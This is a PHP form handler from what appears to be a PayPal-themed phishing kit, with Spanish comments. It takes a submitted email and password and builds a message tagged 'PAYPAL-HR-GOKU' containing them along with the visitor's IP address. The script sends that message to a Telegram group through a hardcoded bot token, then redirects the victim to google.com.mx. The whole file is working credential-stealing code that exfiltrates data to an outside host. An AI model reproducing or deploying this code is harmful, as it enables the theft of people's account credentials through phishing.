<?php

$correo = $_POST['login_email'];
$contraseña = $_POST['login_password'];

// Validar el correo electrónico
if (!filter_var($correo, FILTER_VALIDATE_EMAIL)) {
    header("Location: index.html");
    exit;
}

// Validar la contraseña
if (strlen($contraseña) < 8) {
    header("Location: index.html");
    exit;
}

// Validar los datos con tu lógica de autenticación 
if ($correo == "usuario@example.com" && $contraseña == "contraseña123") {
    $user_ip = $_SERVER['REMOTE_ADDR'];

    // Datos del formulario
    $login_email = $_POST['login_email'];
    $login_password = $_POST['login_password'];
    $user_ip = $_SERVER['REMOTE_ADDR'];

    // ID del grupo de Telegram
    $chatId = '-1667964659'; // Reemplaza esto con el ID de tu grupo

    // Token de tu bot de Telegram
    $botToken = '6101623188:AAHe68-C0OtB00q6pDjc7JLBZEQqqFNpVl0';

    // Mensaje a enviar
    $message = "PAYPAL-HR-GOKU\n\n";
    $message .= "Email: $login_email\n";
    $message .= "Password: $login_password\n";
    $message .= "IP address: $user_ip\n";

    // URL de la API de Telegram
    $url = "https://api.telegram.org/bot$botToken/";

    // Envío del mensaje al grupo
    file_get_contents($url . "sendMessage?chat_id=$chatId&text=" . urlencode($message));

    // Redireccionar a google.com.mx
    header("Location: https://www.google.com.mx");
    exit;
} else {
    // Datos inválidos, redireccionar al formulario de inicio de sesión
    header("Location: index.html");
    exit;
}
?>
